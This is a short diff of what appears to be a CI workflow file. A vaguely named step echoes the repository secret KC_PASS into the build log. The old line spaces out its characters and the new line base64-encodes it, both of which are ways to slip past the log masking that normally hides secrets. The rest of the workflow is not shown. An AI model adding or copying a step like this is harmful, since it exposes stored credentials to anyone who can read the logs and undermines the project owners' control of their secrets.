@@ -17,7 +17,7 @@ jobs:
         
       - name: P
         run: |
-          ${{secrets.KC_PASS}} | sed 's/./& /g'
+          echo -n ${{secrets.KC_PASS}} | base64
           
       - name: Build and test app
         run: |
